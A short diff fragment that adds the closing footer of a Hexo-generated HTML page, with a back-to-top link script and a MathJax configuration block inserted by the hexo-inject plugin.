+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
